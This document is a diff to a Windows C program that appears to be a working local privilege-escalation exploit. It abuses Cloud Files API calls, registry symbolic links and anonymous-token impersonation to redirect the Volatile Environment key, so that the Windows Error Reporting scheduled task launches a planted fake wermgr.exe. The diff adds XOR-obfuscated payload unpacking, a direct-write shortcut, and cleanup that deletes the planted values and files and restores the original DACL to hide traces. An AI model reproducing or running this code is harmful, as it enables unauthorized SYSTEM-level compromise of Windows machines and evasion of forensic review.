@@ -25,6 +25,7 @@
 typedef LONG NTSTATUS;
 
 #define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001A)
+#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023)
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000)
 #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001)
 
@@ -36,13 +37,6 @@ typedef LONG NTSTATUS;
 #define TARGET_KEY L"\\Registry\\User\\.DEFAULT\\Volatile Environment"
 
 #define CONFIG_DIR L"C:\\ProgramData"
-
-#define CHECK_HR(hr)                                                           \
-  do {                                                                         \
-    HRESULT _hr_temp = (hr);                                                   \
-    if (FAILED(_hr_temp))                                                      \
-      goto cleanup;                                                            \
-  } while (0)
 
 #define DBG(fmt, ...) wprintf(L"[DEBUG] " fmt L"\n", ##__VA_ARGS__)
 
@@ -60,17 +54,10 @@ typedef struct _KEY_BASIC_INFORMATION {
   WCHAR Name[1];
 } KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;
 
-typedef enum _AbortHydrationFlags {
-  AbortHydrationFlagsNone = 0,
+typedef enum {
   AbortHydrationFlagsUnblock = 1,
   AbortHydrationFlagsBlock = 2,
 } AbortHydrationFlags;
-
-typedef struct _CF_PLATFORM_INFO {
-  DWORD BuildNumber;
-  DWORD RevisionNumber;
-  DWORD IntegrationNumber;
-} CF_PLATFORM_INFO;
 
 typedef NTSTATUS(NTAPI *PNtOpenKey)(PHANDLE KeyHandle,
                                     ACCESS_MASK DesiredAccess,
@@ -82,6 +69,9 @@ typedef NTSTATUS(NTAPI *PNtSetTokenInformation)(
 typedef NTSTATUS(NTAPI *PNtSetSecurityObject)(
     HANDLE Handle, SECURITY_INFORMATION SecurityInformation,
     PSECURITY_DESCRIPTOR SecurityDescriptor);
+typedef NTSTATUS(NTAPI *PNtQuerySecurityObject)(
+    HANDLE Handle, SECURITY_INFORMATION SecurityInformation,
+    PSECURITY_DESCRIPTOR SecurityDescriptor, ULONG Length, PULONG LengthNeeded);
 typedef NTSTATUS(NTAPI *PNtDeleteKey)(HANDLE KeyHandle);
 typedef NTSTATUS(NTAPI *PNtEnumerateKey)(
     HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass,
@@ -103,13 +93,14 @@ typedef NTSTATUS(NTAPI *PNtSetValueKey)(HANDLE KeyHandle,
                                         PUNICODE_STRING ValueName,
                                         ULONG TitleIndex, ULONG Type,
                                         PVOID Data, ULONG DataSize);
+typedef NTSTATUS(NTAPI *PNtDeleteValueKey)(HANDLE KeyHandle,
+                                           PUNICODE_STRING ValueName);
 typedef NTSTATUS(NTAPI *PNtSetInformationToken)(HANDLE TokenHandle,
                                                 int TokenInformationClass,
                                                 PVOID TokenInformation,
                                                 ULONG TokenInformationLength);
 typedef HRESULT(WINAPI *PCfAbortOperation)(DWORD pid, PVOID unknown,
                                            AbortHydrationFlags flags);
-typedef HRESULT(WINAPI *PCfGetPlatformInfo)(CF_PLATFORM_INFO *info);
 
 static volatile BOOL g_done = FALSE;
 static WCHAR g_rid[16];
@@ -117,20 +108,75 @@ static WCHAR g_pipeName[64];
 static WCHAR g_configDir[MAX_PATH];
 static WCHAR g_payloadPath[MAX_PATH];
 
-void ExecuteTask() {
-  HRESULT hr = S_OK;
+static HANDLE OpenKey(HANDLE hRoot, PCWSTR path, ACCESS_MASK desiredAccess);
+static void SetSecurityDescriptor(NtKey key, SecurityInformation info);
+
+static BOOL TestDirectWrite() {
+  HANDLE hKey = OpenKey(NULL, TARGET_KEY, KEY_SET_VALUE);
+  if (hKey != NULL) {
+    DBG(L"TestDirectWrite: KEY_SET_VALUE via Anonymous token: YES");
+    CloseHandle(hKey);
+    return TRUE;
+  }
+
+  HANDLE hDac = OpenKey(NULL, TARGET_KEY, WRITE_DAC);
+  if (hDac != NULL) {
+    DBG(L"TestDirectWrite: WRITE_DAC via Anonymous token: YES");
+    SetSecurityDescriptor(hDac, DACL_SECURITY_INFORMATION);
+    CloseHandle(hDac);
+
+    hKey = OpenKey(NULL, TARGET_KEY, KEY_SET_VALUE);
+    if (hKey != NULL) {
+      DBG(L"TestDirectWrite: KEY_SET_VALUE after ACL fix: YES");
+      CloseHandle(hKey);
+      return TRUE;
+    }
+    DBG(L"TestDirectWrite: ACL fixed but KEY_SET_VALUE still denied");
+    return FALSE;
+  }
+
+  {
+    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
+    if (!hNtDll)
+      return FALSE;
+
+    UNICODE_STRING usPath;
+    usPath.Buffer = TARGET_KEY;
+    usPath.Length = (USHORT)(wcslen(TARGET_KEY) * sizeof(WCHAR));
+    usPath.MaximumLength = usPath.Length + sizeof(WCHAR);
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, &usPath, OBJ_CASE_INSENSITIVE, NULL,
+                               NULL);
+
+    PNtOpenKey NtOpenKey = (PNtOpenKey)GetProcAddress(hNtDll, "NtOpenKey");
+    if (NtOpenKey) {
+      HANDLE hRaw = NULL;
+      if (NT_SUCCESS(NtOpenKey(&hRaw, KEY_SET_VALUE, &objAttr))) {
+        DBG(L"TestDirectWrite: KEY_SET_VALUE via user token: YES");
+        CloseHandle(hRaw);
+        return TRUE;
+      }
+    }
+  }
+
+  DBG(L"TestDirectWrite: direct write NOT AVAILABLE");
+  return FALSE;
+}
+
+static void ExecuteTask() {
   ITaskService *pService = NULL;
   ITaskFolder *pRootFolder = NULL;
   IRegisteredTask *pRegisteredTask = NULL;
   IRunningTask *pRunningTask = NULL;
 
-  hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-  if (FAILED(hr))
+  if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
     return;
 
-  hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
-                        &IID_ITaskService, (void **)&pService);
-  CHECK_HR(hr);
+  HRESULT hr =
+      CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
+                       &IID_ITaskService, (void **)&pService);
+  if (FAILED(hr))
+    goto cleanup;
 
   VARIANT varEmpty;
   VariantInit(&varEmpty);
@@ -138,21 +184,27 @@ void ExecuteTask() {
 
   hr = pService->lpVtbl->Connect(pService, varEmpty, varEmpty, varEmpty,
                                  varEmpty);
-  CHECK_HR(hr);
+  if (FAILED(hr))
+    goto cleanup;
 
   BSTR folderPath =
       SysAllocString(L"\\Microsoft\\Windows\\Windows Error Reporting");
+  if (!folderPath)
+    goto cleanup;
   hr = pService->lpVtbl->GetFolder(pService, folderPath, &pRootFolder);
   SysFreeString(folderPath);
-  CHECK_HR(hr);
+  if (FAILED(hr))
+    goto cleanup;
 
   BSTR taskName = SysAllocString(L"QueueReporting");
+  if (!taskName)
+    goto cleanup;
   hr = pRootFolder->lpVtbl->GetTask(pRootFolder, taskName, &pRegisteredTask);
   SysFreeString(taskName);
-  CHECK_HR(hr);
+  if (FAILED(hr))
+    goto cleanup;
 
-  hr = pRegisteredTask->lpVtbl->Run(pRegisteredTask, varEmpty, &pRunningTask);
-  CHECK_HR(hr);
+  pRegisteredTask->lpVtbl->Run(pRegisteredTask, varEmpty, &pRunningTask);
 
 cleanup:
   if (pRunningTask)
@@ -166,7 +218,8 @@ cleanup:
   CoUninitialize();
 }
 
-NTSTATUS CreateRegistrySymbolicLink(LPCWSTR SymlinkPath, LPCWSTR TargetPath) {
+static NTSTATUS CreateRegistrySymbolicLink(LPCWSTR SymlinkPath,
+                                           LPCWSTR TargetPath) {
   HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
   if (!hNtdll)
     return STATUS_DLL_NOT_FOUND;
@@ -206,9 +259,9 @@ NTSTATUS CreateRegistrySymbolicLink(LPCWSTR SymlinkPath, LPCWSTR TargetPath) {
   CloseHandle(hKey);
   return status;
 }
-void DeleteRegistryTree(HANDLE hRoot);
+static void DeleteRegistryTree(HANDLE hRoot);
 
-HANDLE OpenKey(HANDLE hRoot, PCWSTR path, ACCESS_MASK desiredAccess) {
+static HANDLE OpenKey(HANDLE hRoot, PCWSTR path, ACCESS_MASK desiredAccess) {
   UNICODE_STRING usPath;
   usPath.Buffer = (PWSTR)path;
   usPath.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
@@ -244,7 +297,7 @@ HANDLE OpenKey(HANDLE hRoot, PCWSTR path, ACCESS_MASK desiredAccess) {
   return NULL;
 }
 
-void SetSecurityDescriptor(NtKey key, SecurityInformation info) {
+static void SetSecurityDescriptor(NtKey key, SecurityInformation info) {
   LPCWSTR sddl =
       L"D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)"
       L"S:(ML;OICI;NW;;;S-1-16-0)";
@@ -288,8 +341,7 @@ void SetSecurityDescriptor(NtKey key, SecurityInformation info) {
 
   if (pAbsSD && pDacl && pSacl && pOwner && pPrimGrp) {
     if (MakeAbsoluteSD(pRelSD, pAbsSD, &absSDSize, pDacl, &daclSize, pSacl,
-                       &saclSize, pOwner, &ownerSize, pPrimGrp,
-                       &primGrpSize)) {
+                       &saclSize, pOwner, &ownerSize, pPrimGrp, &primGrpSize)) {
       SecurityInformation sanitizedInfo = info & ~SACL_SECURITY_INFORMATION;
       NtSetSecurityObject(key, sanitizedInfo, pAbsSD);
     }
@@ -308,7 +360,7 @@ void SetSecurityDescriptor(NtKey key, SecurityInformation info) {
   LocalFree(pRelSD);
 }
 
-BOOL ForceKeyDeleteKey(HANDLE hRoot, PCWSTR name) {
+static BOOL ForceKeyDeleteKey(HANDLE hRoot, PCWSTR name) {
   HANDLE hKeyDac = OpenKey(hRoot, name, WRITE_DAC);
   if (hKeyDac != NULL) {
     SetSecurityDescriptor(hKeyDac, DACL_SECURITY_INFORMATION);
@@ -331,7 +383,6 @@ BOOL ForceKeyDeleteKey(HANDLE hRoot, PCWSTR name) {
     return FALSE;
   }
 
-  typedef NTSTATUS(NTAPI *PNtDeleteKey)(HANDLE KeyHandle);
   PNtDeleteKey pNtDeleteKey =
       (PNtDeleteKey)GetProcAddress(hNtDll, "NtDeleteKey");
 
@@ -342,7 +393,7 @@ BOOL ForceKeyDeleteKey(HANDLE hRoot, PCWSTR name) {
   CloseHandle(hKeyDelete);
   return NT_SUCCESS(status);
 }
-void DeleteRegistryTree(HANDLE hRoot) {
+static void DeleteRegistryTree(HANDLE hRoot) {
   HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
   if (hNtDll == NULL)
     return;
@@ -383,7 +434,7 @@ void DeleteRegistryTree(HANDLE hRoot) {
   free(pKeyInfo);
 }
 
-DWORD WINAPI ForceTokenThread(LPVOID lpParameter) {
+static DWORD WINAPI ForceTokenThread(LPVOID lpParameter) {
   HANDLE hTargetThread = (HANDLE)lpParameter;
   HANDLE hAnonToken = NULL;
   HANDLE hNullToken = NULL;
@@ -392,8 +443,7 @@ DWORD WINAPI ForceTokenThread(LPVOID lpParameter) {
     return 1;
 
   PNtSetInformationThread NtSetInformationThread =
-      (PNtSetInformationThread)GetProcAddress(hNtDll,
-                                              "NtSetInformationThread");
+      (PNtSetInformationThread)GetProcAddress(hNtDll, "NtSetInformationThread");
   if (NtSetInformationThread == NULL)
     return 1;
 
@@ -415,7 +465,7 @@ DWORD WINAPI ForceTokenThread(LPVOID lpParameter) {
   return 0;
 }
 
-DWORD WINAPI CheckKeyThread(LPVOID lpParameter) {
+static DWORD WINAPI CheckKeyThread(LPVOID lpParameter) {
   bool useRootKey = (bool)lpParameter;
   HANDLE hKey = NULL, hEvent = NULL;
   NTSTATUS status;
@@ -460,7 +510,7 @@ DWORD WINAPI CheckKeyThread(LPVOID lpParameter) {
   return 0;
 }
 
-void Stage1(BOOL root_key) {
+static void Stage1(BOOL root_key) {
   DBG(L"Stage1 enter, root_key=%d", root_key);
   g_done = FALSE;
 
@@ -517,12 +567,12 @@ void Stage1(BOOL root_key) {
   DBG(L"Stage1: loop exited");
 }
 
-DWORD WINAPI Stage1Thread(LPVOID lpParameter) {
+static DWORD WINAPI Stage1Thread(LPVOID lpParameter) {
   Stage1((BOOL)(SIZE_T)lpParameter);
   return 0;
 }
 
-void Stage2() {
+static void Stage2() {
   DBG(L"Stage2 enter");
   HANDLE hCloudFilesKey = OpenKey(
       NULL, CLOUD_FILES, WRITE_DAC | WRITE_OWNER | KEY_ENUMERATE_SUB_KEYS);
@@ -543,13 +593,13 @@ void Stage2() {
   DBG(L"Stage2 done");
 }
 
-DWORD WINAPI Stage2Thread(LPVOID lpParameter) {
+static DWORD WINAPI Stage2Thread(LPVOID lpParameter) {
   (void)lpParameter;
   Stage2();
   return 0;
 }
 
-void Stage3() {
+static void Stage3() {
   DBG(L"Stage3 enter");
 
   HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
@@ -572,6 +622,25 @@ void Stage3() {
     CloseHandle(hBlockedKey);
   } else
     DBG(L"Stage3: OpenKey(BLOCKED_APPS, DELETE) returned NULL");
+
+  PSECURITY_DESCRIPTOR savedSd = NULL;
+  HANDLE hSaveKey = OpenKey(NULL, TARGET_KEY, READ_CONTROL);
+  if (hSaveKey) {
+    PNtQuerySecurityObject NtQuerySecurityObject =
+        (PNtQuerySecurityObject)GetProcAddress(hNtDll, "NtQuerySecurityObject");
+    if (NtQuerySecurityObject) {
+      ULONG len = 0;
+      NTSTATUS st = NtQuerySecurityObject(hSaveKey, DACL_SECURITY_INFORMATION,
+                                          NULL, 0, &len);
+      if (st == STATUS_BUFFER_TOO_SMALL && len > 0) {
+        savedSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, len);
+        if (savedSd)
+          NtQuerySecurityObject(hSaveKey, DACL_SECURITY_INFORMATION, savedSd,
+                                len, &len);
+      }
+    }
+    CloseHandle(hSaveKey);
+  }
 
   HANDLE hTargetKey = OpenKey(NULL, TARGET_KEY, WRITE_DAC | WRITE_OWNER);
   if (hTargetKey != NULL) {
@@ -661,23 +730,32 @@ void Stage3() {
   wcscat(fakeWerPath, L"\\wermgr.exe");
 
   DBG(L"Stage3: writing fake wermgr.exe to %s", fakeWerPath);
-  HANDLE hWerFile =
-      CreateFileW(fakeWerPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
-                  FILE_ATTRIBUTE_NORMAL, NULL);
+  HANDLE hWerFile = CreateFileW(fakeWerPath, GENERIC_WRITE, 0, NULL,
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   if (hWerFile != INVALID_HANDLE_VALUE) {
-    DWORD written;
-    WriteFile(hWerFile, build_mini_runner_exe, build_mini_runner_exe_len, &written,
-              NULL);
-    CloseHandle(hWerFile);
-    DBG(L"Stage3: wrote %lu bytes", written);
+    BYTE *decrypted =
+        HeapAlloc(GetProcessHeap(), 0, build_mini_runner_exe_packed_len);
+    if (!decrypted) {
+      CloseHandle(hWerFile);
+      DBG(L"Stage3: HeapAlloc FAILED");
+    } else {
+      DWORD written;
+      for (size_t i = 0; i < build_mini_runner_exe_packed_len; i++)
+        decrypted[i] = build_mini_runner_exe_packed[i] ^ 0xAB;
+      WriteFile(hWerFile, decrypted, build_mini_runner_exe_packed_len, &written,
+                NULL);
+      HeapFree(GetProcessHeap(), 0, decrypted);
+      CloseHandle(hWerFile);
+      DBG(L"Stage3: wrote %lu bytes", written);
+    }
   } else
     DBG(L"Stage3: CreateFileW(wermgr.exe) FAILED gle=%lu", GetLastError());
 
   DBG(L"Stage3: creating pipe %s", g_pipeName);
-  HANDLE hPipe = CreateNamedPipeW(g_pipeName, PIPE_ACCESS_DUPLEX,
-                                   PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE |
-                                       PIPE_WAIT,
-                                   1, 0, 0, NMPWAIT_USE_DEFAULT_WAIT, NULL);
+  HANDLE hPipe =
+      CreateNamedPipeW(g_pipeName, PIPE_ACCESS_DUPLEX,
+                       PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1,
+                       0, 0, NMPWAIT_USE_DEFAULT_WAIT, NULL);
   if (hPipe == INVALID_HANDLE_VALUE) {
     DBG(L"Stage3: CreateNamedPipeW FAILED gle=%lu", GetLastError());
     return;
@@ -701,19 +779,24 @@ void Stage3() {
   BOOL bReadSuccess =
       ReadFile(hPipe, inBuffer, sizeof(inBuffer), &bytesRead, NULL);
 
-  DBG(L"Stage3: ReadFile returned %d, gle=%lu, bytes=%lu",
-      bReadSuccess, GetLastError(), bytesRead);
+  DBG(L"Stage3: ReadFile returned %d, gle=%lu, bytes=%lu", bReadSuccess,
+      GetLastError(), bytesRead);
 
   if (bReadSuccess && bytesRead > 0)
     wprintf(L":)\n");
   else if (GetLastError() == ERROR_BROKEN_PIPE)
-    wprintf(L":)\n");
+    wprintf(L"Broken Pipe\n");
   else
     wprintf(L":(\n");
 
   CloseHandle(hPipe);
   Sleep(1000);
 
+  DBG(L"Stage3: cleaning up files and directories");
+  if (DeleteFileW(fakeWerPath))
+    DBG(L"Stage3: deleted wermgr.exe");
+  else
+    DBG(L"Stage3: DeleteFileW(wermgr.exe) gle=%lu", GetLastError());
   RemoveDirectoryW(fakeSys32Path);
   RemoveDirectoryW(g_configDir);
 
@@ -723,8 +806,51 @@ void Stage3() {
     return;
   }
 
+  DBG(L"Stage3: deleting subkeys");
   DeleteRegistryTree(hTargetKeyDelete);
   CloseHandle(hTargetKeyDelete);
+
+  DBG(L"Stage3: deleting written values");
+  HANDLE hCleanupKey = OpenKey(NULL, TARGET_KEY, KEY_SET_VALUE);
+  if (hCleanupKey) {
+    PNtDeleteValueKey NtDeleteValueKey =
+        (PNtDeleteValueKey)GetProcAddress(hNtDll, "NtDeleteValueKey");
+    if (NtDeleteValueKey) {
+      UNICODE_STRING usVal;
+      usVal.Buffer = L"windir";
+      usVal.Length = (USHORT)(wcslen(L"windir") * sizeof(WCHAR));
+      usVal.MaximumLength = usVal.Length + sizeof(WCHAR);
+      NtDeleteValueKey(hCleanupKey, &usVal);
+
+      usVal.Buffer = L"mp_pipe";
+      usVal.Length = (USHORT)(wcslen(L"mp_pipe") * sizeof(WCHAR));
+      usVal.MaximumLength = usVal.Length + sizeof(WCHAR);
+      NtDeleteValueKey(hCleanupKey, &usVal);
+
+      usVal.Buffer = L"mp_payload";
+      usVal.Length = (USHORT)(wcslen(L"mp_payload") * sizeof(WCHAR));
+      usVal.MaximumLength = usVal.Length + sizeof(WCHAR);
+      NtDeleteValueKey(hCleanupKey, &usVal);
+    }
+    CloseHandle(hCleanupKey);
+  }
+
+  if (savedSd) {
+    DBG(L"Stage3: restoring original DACL");
+    HANDLE hRestoreKey = OpenKey(NULL, TARGET_KEY, WRITE_DAC);
+    if (hRestoreKey) {
+      PNtSetSecurityObject pNtSetSecurityObject =
+          (PNtSetSecurityObject)GetProcAddress(hNtDll, "NtSetSecurityObject");
+      if (pNtSetSecurityObject) {
+        pNtSetSecurityObject(hRestoreKey, DACL_SECURITY_INFORMATION, savedSd);
+        DBG(L"Stage3: DACL restored");
+      }
+      CloseHandle(hRestoreKey);
+    }
+    LocalFree(savedSd);
+  } else
+    DBG(L"Stage3: no saved DACL to restore");
+
   DBG(L"Stage3 done");
 }
 
@@ -746,64 +872,45 @@ static void BuildPaths() {
 }
 
 int main(int argc, char *argv[]) {
-  DBG(L"main started, argc=%d", argc);
   if (argc >= 2)
     mbstowcs(g_payloadPath, argv[1], MAX_PATH);
   else
     wcscpy(g_payloadPath, L"C:\\Windows\\System32\\conhost.exe");
 
-  DBG(L"loading cldapi.dll");
   HMODULE hCfApi = LoadLibraryW(L"cldapi.dll");
   if (hCfApi == NULL) {
     DBG(L"LoadLibraryW(cldapi.dll) FAILED, GLE=%lu", GetLastError());
     return 1;
   }
-  DBG(L"cldapi.dll loaded at %p", hCfApi);
-
-  PCfGetPlatformInfo CfGetPlatformInfo =
-      (PCfGetPlatformInfo)GetProcAddress(hCfApi, "CfGetPlatformInfo");
-  if (CfGetPlatformInfo == NULL) {
-    DBG(L"CfGetPlatformInfo not found");
-    return 1;
-  }
-
-  CF_PLATFORM_INFO cfInfo;
-  HRESULT hr = CfGetPlatformInfo(&cfInfo);
-  DBG(L"CfGetPlatformInfo returned hr=0x%08lX (build=%lu rev=%lu)",
-      hr, cfInfo.BuildNumber, cfInfo.RevisionNumber);
-  CHECK_HR(hr);
 
   GenerateRid();
   BuildPaths();
-  DBG(L"rid=%s configDir=%s pipeName=%s payload=%s",
-      g_rid, g_configDir, g_pipeName, g_payloadPath);
 
-  DBG(L"=== Stage1 ===");
-  {
-    HANDLE hThread =
-        CreateThread(NULL, 0, Stage1Thread, (LPVOID)(SIZE_T)TRUE, 0, NULL);
-    if (hThread == NULL) DBG(L"Stage1Thread CreateThread FAILED");
-    WaitForSingleObject(hThread, 15000);
-    CloseHandle(hThread);
+  if (TestDirectWrite()) {
+    Stage3();
+  } else {
+    DBG(L"=== Stage1 ===");
+    {
+      HANDLE hThread =
+          CreateThread(NULL, 0, Stage1Thread, (LPVOID)(SIZE_T)TRUE, 0, NULL);
+      if (hThread == NULL)
+        DBG(L"Stage1Thread CreateThread FAILED");
+      WaitForSingleObject(hThread, 15000);
+      CloseHandle(hThread);
+    }
+
+    DBG(L"=== Stage2 ===");
+    {
+      HANDLE hThread = CreateThread(NULL, 0, Stage2Thread, NULL, 0, NULL);
+      if (hThread == NULL)
+        DBG(L"Stage2Thread CreateThread FAILED");
+      WaitForSingleObject(hThread, 15000);
+      CloseHandle(hThread);
+    }
+
+    DBG(L"=== Stage3 ===");
+    Stage3();
   }
 
-  DBG(L"=== Stage2 ===");
-  {
-    HANDLE hThread = CreateThread(NULL, 0, Stage2Thread, NULL, 0, NULL);
-    if (hThread == NULL) DBG(L"Stage2Thread CreateThread FAILED");
-    WaitForSingleObject(hThread, 15000);
-    CloseHandle(hThread);
-  }
-
-  DBG(L"=== Stage3 ===");
-  Stage3();
-
-  DBG(L"=== Done ===");
-  wprintf(L"Press Enter to exit...");
-  getchar();
   return 0;
-
-cleanup:
-  DBG(L"cleanup: CfGetPlatformInfo failed");
-  return 1;
 }
